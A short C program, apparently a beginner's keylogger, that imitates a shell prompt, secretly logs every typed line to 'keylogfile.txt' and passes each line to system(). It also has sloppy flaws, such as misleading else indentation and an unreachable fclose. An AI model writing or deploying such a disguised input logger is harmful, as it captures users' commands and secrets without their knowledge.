#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define MAX 255

void main() 
{

	char kbinput[MAX];
	int loop_continue = 1;
	FILE *fptr = fopen("keylogfile.txt", "w");

	while (1)
	{
		printf("User@User: ");
		fgets(kbinput, MAX, stdin);

		if(strcmp(kbinput, "~\n") == 0)
			exit(1);
		else 
			fputs(kbinput, fptr);
			system(kbinput);
	}

	fclose(fptr);
	

}
